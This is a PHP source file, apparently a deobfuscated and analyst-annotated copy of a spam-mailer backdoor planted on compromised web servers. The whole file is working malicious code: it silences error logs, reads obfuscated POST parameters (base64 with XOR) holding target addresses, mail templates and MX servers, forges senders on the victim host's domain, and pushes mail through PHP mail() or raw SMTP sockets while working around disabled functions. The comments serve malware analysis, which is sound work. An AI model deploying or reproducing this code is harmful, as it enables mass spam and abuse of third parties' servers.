<?php
@error_reporting(0); //Report no errors
@ini_set(chr(101).chr(114).'ror_log',NULL);//error_log
@ini_set('log_errors',0); 

if (count($_POST) < 2) { 
	die(PHP_OS.chr(49).chr(48).chr(43).md5(0987654321)); //[OS]10+6fb42da0e32e07b61c9f0251fe627a9c
} 
$bAllParametersSet = false;
 
foreach (array_keys($_POST) as $PostArrayKey) { 
	switch ($PostArrayKey[0]) { 
		case chr(108): $KeyL = $PostArrayKey;  //l[Random Chars]<-email addresses to by spammed are located in this parameter.
		break; 
		case chr(100): $KeyD = $PostArrayKey; //d[Random Chars] <-email template goes here.
		break; 
		case chr(109): $KeyM = $PostArrayKey; //m[Random Chars]<-MX Servers are located in this parameter.
		break; 
		case chr(101); //e[Random Chars] [!] note the termination here. No idea what it does
				$bAllParametersSet = true; 
				break; 
	} 
} 
/*
	*	If l or d are not set then die with output [OS]. [OS]11+6fb42da0e32e07b61c9f0251fe627a9c
	*/
if ($KeyL === '' || $KeyD === '') 
	die(PHP_OS.chr(49).chr(49).chr(43).md5(0987654321)); //[OS]11+6fb42da0e32e07b61c9f0251fe627a9c

$disabledFunctionsVar = preg_split('/\,(\ +)?/', @ini_get('disable_functions')); //get all disabled functions

$emailAddresses = @$_POST[$KeyL]; 
$emailTemplate = @$_POST[$KeyD]; //KeyD gets the data in POST[KeyD]
$mxServer = @$_POST[$KeyM]; //KeyM gets the data in POST[KeyM]
// If all parameters set, deobfuscate data.
if ($bAllParametersSet) { 
	$emailAddresses = deobfuscateData($emailAddresses); 
	$emailTemplate = deobfuscateData($emailTemplate); 
	$mxServer = deobfuscateData($mxServer); 
} 

$emailAddresses = urldecode(stripslashes($emailAddresses)); 
$emailTemplate = urldecode(stripslashes($emailTemplate)); 
$mxServer = urldecode(stripslashes($mxServer)); 

/*
*	Checks whether multiple data or single was sent on POST L parameter.
*	Data is split using # ie data1#data2#etc
*/
if (strpos($emailAddresses, '#',1) != false) { 
	//many mails
	$emailsArray = preg_split('/#/', $emailAddresses); 
	$emailsArraySize = count($emailsArray); 
} else { 
	$emailsArray[0] = $emailAddresses; //only 1 mail.
	$emailsArraySize = 1; 
} 

for ($i=0; $i < $emailsArraySize;$i++) { 
	$recptData = $emailsArray[$i]; 
	//if email data doesn't contain mail, skip loop iteration.
	if ($recptData == '' || !strpos($recptData,'@',1))  
		continue; 
	//Recipient stuff
	if (strpos($recptData, ';', 1) != false) { 
		//recptData var has 3 parts splitted by ;
		list($recptName, $recptSurname, $recptMail) = preg_split('/;/',strtolower($recptData)); 
		$recptName = ucfirst($recptName); 
		$recptSurname = ucfirst($recptSurname); 
		$recptDomain = next(explode('@', $recptMail)); 
	
		if ($recptSurname == '' || $recptName == '') { 
			$recptSurname = $recptName = ''; 
			$recptData = $recptMail; 
		} else { 
			$recptData = "\"$recptName $recptSurname\" <$recptMail>"; 
		} 
	
	} else { 
		$recptSurname = $recptName = ''; 
		$recptMail = strtolower($recptData); 
		$recptDomain = next(explode('@', $recptData)); 
	} 
	
	preg_match('|<USER>(.*)</USER>|imsU', $emailTemplate, $matches); 
	$senderUsername = $matches[1]; 
	preg_match('|<NAME>(.*)</NAME>|imsU', $emailTemplate, $matches); 
	$matches = $matches[1]; 
	preg_match('|<SUBJ>(.*)</SUBJ>|imsU', $emailTemplate, $subject); 
	$subject = $subject[1]; 
	preg_match('|<SBODY>(.*)</SBODY>|imsU', $emailTemplate, $mailBody); 
	//Customize mail to recipient's "needs"
	$mailBody= $mailBody[1]; 
	$subject = str_replace("%R_NAME%", $recptName, $subject); //Add recipient's name on subject
	$subject = str_replace("%R_LNAME%", $recptSurname, $subject); //Add recipient's surname on subject
	$mailBody = str_replace("%R_NAME%", $recptName, $mailBody); //Add recipient's name on body
	$mailBody = str_replace("%R_LNAME%", $recptSurname, $mailBody); //Add recipient's name on body
	$victimServerHostname = preg_replace('/^(www|ftp)\./i', '', @$_SERVER['HTTP_HOST']); //Host is victim server
	
	if (matchIP($victimServerHostname) || @ini_get('safe_mode')) //If host doesn't match IPv4 scheme or safe_mode mail() takes 4 parameters
		$safeModeOnFlag = false; 
	else 
		$safeModeOnFlag = true; 
	
	$senderMail = "$senderUsername@$victimServerHostname"; 
	//If name/surname of sender is known
	if ($matches != '') 
		$senderMail = "$matches <$senderMail>"; 
	else 
		$senderMail = $senderMail; 
	
	$HeaderFromReplyTo = "From: $senderMail\r\n"; 
	$HeaderFromReplyTo .= "Reply-To: $senderMail\r\n"; 
	$XHeaders = "X-Priority: 3 (Normal)\r\n"; 
	$XHeaders .= "MIME-Version: 1.0\r\n"; 
	$XHeaders .= "Content-Type: text/html; charset=\"iso-8859-1\"\r\n"; 
	$XHeaders .= "Content-Transfer-Encoding: 8bit\r\n"; 
	$PHPMailFunction = 'ma'.chr(105).'l'; //mail cpt obvious
	//if php's mail function exists, use it
	//PHPMailFunction==mail()
	if (!in_array('m'.'a'.'il', $disabledFunctionsVar)) { 
		//mail is not disabled
		//safe mode is not turned on
		if ($safeModeOnFlag) { 
	
			if (@$PHPMailFunction($recptData, $subject, $mailBody, $HeaderFromReplyTo.$XHeaders, "-f$senderMail")) { //note that is adds
				echo(chr(79).chr(75).md5(1234567890)."+0\n"); //OKe807f1fcf82d132f9bb018ca6738a19f+0 newline if mail was sent succesfully
				continue; 
			} 
		
		} else { 
		//safe_mode is on. 4 parameters.
			if (@$PHPMailFunction($recptData, $subject, $mailBody, $XHeaders)) { 
				echo(chr(79).chr(75).md5(1234567890)."+0\n"); //OKe807f1fcf82d132f9bb018ca6738a19f+0 newline if mail was sent succesfully
				continue; 
			} 
		} 
	} 
	
	$mailBuilderString = "Date: " . @date("D, j M Y G:i:s O")."\r\n" . $HeaderFromReplyTo; 
	$mailBuilderString .= "Message-ID: <".preg_replace('/(.{7})(.{5})(.{2}).*/', '$1-$2-$3', md5(time()))."@$victimHostname>\r\n"; 
	$mailBuilderString .= "To: $recptData\r\n"; 
	$mailBuilderString .= "Subject: $subject\r\n"; 
	$mailBuilderString .= $XHeaders; 
	$CompleteMail = $mailBuilderString."\r\n".$mailBody; 
	/*
	* If no MX Servers are given then they try and get them from user mails username@host<-
	*/
	if ($mxServer == '') 
		$mxServer = getMXHost($recptDomain); 
	
	if (($sendMailToServerFail = sendMailToServer($senderMail, $recptMail, $CompleteMail, $victimHostname, $mxServer)) == 0) { 
		echo(chr(79).chr(75).md5(1234567890)."+1\n"); // OKOKe807f1fcf82d132f9bb018ca6738a19f+1 newline
		continue; 
	} else { 
		echo PHP_OS.chr(50).chr(48).'+'.md5(0987654321)."+$sendMailToServerFail\n"; //[OS]20+6fb42da0e32e07b61c9f0251fe627a9c+[$sendMailToServerFail] newline
	} 
} 
/*
*	It will check whether the string matches an ip (IPv4).
*/
function matchIP($v957b527b){ 
	return preg_match("/^([1-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])(\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])){3}$/", $v957b527b); 
} 

/* This function is never called in the above script*/

function neverCalledFunction($strInputParam, $intInputParam = 0, $crlf="=\r\n", $intTermination = 0, $bFlag = false) { 
	$strInputParamLength = strlen($strInputParam); 
	$returnData = ''; 
	for($i = 0; $i < $strInputParamLength; $i++) { 
		
		if ($intInputParam >= 75) { 
			$intInputParam = $intTermination; 
			$returnData .= $crlf; 
		} 
		$ASCIIValueOfChar = ord($strInputParam[$v865c0c0b]); 
		if (($ASCIIValueOfChar == 0x3d) || ($ASCIIValueOfChar >= 0x80) || ($ASCIIValueOfChar < 0x20)) { //if (char is =) or (char is equal or bigger than \80) or (char smaller than space)
			if ((($ASCIIValueOfChar == 0x0A) || ($ASCIIValueOfChar == 0x0D)) && (!$bFlag)) { //if ((char is \n) or (char is \r)) and (bFlag=false)
				$returnData.=chr($ASCIIValueOfChar); 
				$intInputParam = 0; 
				continue; 
			} 
			$returnData .='='.str_pad(strtoupper(dechex($ASCIIValueOfChar)), 2, '0', STR_PAD_LEFT); //add 2 0s left of the Uppercase Ascii 
			$intInputParam += 3; 
			continue; 
		} 
		$returnData .= chr($ASCIIValueOfChar); 
		$intInputParam++; 
	} 
	return $returnData; 
} 
function sendMailToServer($senderMail, $recptMail, $CompleteMail, $victimHostname, $mxServer) { 
	global $disabledFunctionsVar; 
	//Try to open a socket either with fsockopen or pfsockopen or stream_socket_client
	if (!in_array('fsockopen', $disabledFunctionsVar)) 
		$socketPointer = @fsockopen($mxServer, 25, $errNo, $errStr, 20); 
	elseif (!in_array('pfsockopen', $disabledFunctionsVar)) 
		$socketPointer = @pfsockopen($mxServer, 25, $errNo, $errStr, 20); 
	elseif (!in_array('stream_socket_client', $disabledFunctionsVar) && function_exists("stream_socket_client")) 
		$socketPointer = @stream_socket_client("tcp://$mxServer:25", $errNo, $errStr, 20); 
	else 
		return -1; 
	
	if (!$socketPointer) { 
		return 1; 
	} else { 
		//If our socket worked->fetch data.
		$dataReceived = readDataFromSocket($socketPointer); 
		
		//Initiate SMTP
		@fputs($socketPointer, "EHLO $victimHostname\r\n"); //initiate connection with $mxServer
		$MailServerResponse = readDataFromSocket($socketPointer); 
		if (substr($MailServerResponse, 0, 3) != 250 ) //if status <> 250 (Requested action taken and completed)
			return "2+($recptMail)+".preg_replace('/(\r\n|\r|\n)/', '|', $MailServerResponse); 
		
		//From part
		@fputs($socketPointer, "MAIL FROM:<$senderMail>\r\n"); 
		$MailServerResponse = readDataFromSocket($socketPointer); 
		if (substr($MailServerResponse, 0, 3) != 250 ) 
			return "3+($recptMail)+".preg_replace('/(\r\n|\r|\n)/', '|', $MailServerResponse); 
		//to part, checks whether recipient exists
		@fputs($socketPointer, "RCPT TO:<$recptMail>\r\n"); 
		$MailServerResponse = readDataFromSocket($socketPointer); 
		if (substr($MailServerResponse, 0, 3) != 250 && substr($MailServerResponse, 0, 3) != 251) //if status <> 251 (Recipient not local to server)
			return "4+($recptMail)+".preg_replace('/(\r\n|\r|\n)/', '|', $MailServerResponse); 
		//data?
		@fputs($socketPointer, "DATA\r\n"); 
		$MailServerResponse = readDataFromSocket($socketPointer); 
		if (substr($MailServerResponse, 0, 3) != 354 )//if status <> 354 then server is ready to accept our data
			return "5+($recptMail)+".preg_replace('/(\r\n|\r|\n)/', '|', $MailServerResponse);
		//data
		@fputs($socketPointer, $CompleteMail."\r\n.\r\n"); 
		$MailServerResponse = readDataFromSocket($socketPointer); 
		if (substr($MailServerResponse, 0, 3) != 250 ) 
			return "6+($recptMail)+".preg_replace('/(\r\n|\r|\n)/', '|', $MailServerResponse); 
		//close connection
		@fputs($socketPointer, "QUIT\r\n"); 
		//close socket
		@fclose($socketPointer); 
		return 0; 
	} 
} 
//reads data from socket and returns it
function readDataFromSocket($socketPointer) { 
	$dataReceived = ''; 
	while($receivingData = @fgets($socketPointer, 4096)) { 
		$dataReceived .= $receivingData; 
		if(substr($receivingData, 3, 1) == ' ') 
			break; 
	} 
	return $dataReceived; 
} 

/*
* It will try to get MX records for a given host.
* If found any, they will be returned to $mxhosts.
*/
function getMXHost($hostname) { 
	global $disabledFunctionsVar; 
	if (!in_array('getmxrr', $disabledFunctionsVar) && function_exists("getmxrr")) { 
		@getmxrr($hostname, $mxhosts, $mxWeight); 
		if (count($mxhosts) === 0) 
			return '127.0.0.1'; 
		$mxhostsKeys = array_keys($mxWeight, min($mxWeight)); 
		return $mxhosts[$mxhostsKeys[0]]; 
	} else { 
		return '127.0.0.1'; 
	} 
} 
/*
* Data deobfuscation.
* Decode base_64 data. Every character gets replaced [i^2]. Ie [97^2]=99=c. 97 Decimal->a
*/
function deobfuscateData($dataInput) { 
	$dataInput = base64_decode($dataInput); 
	$dataReturn = ''; 
	for($i = 0; $i < strlen($dataInput); $i++) 
		$dataReturn .= chr(ord($dataInput[$i]) ^ 2); //Ascii char+2. Ie a^2=c
	return $dataReturn; 
} 
?> 
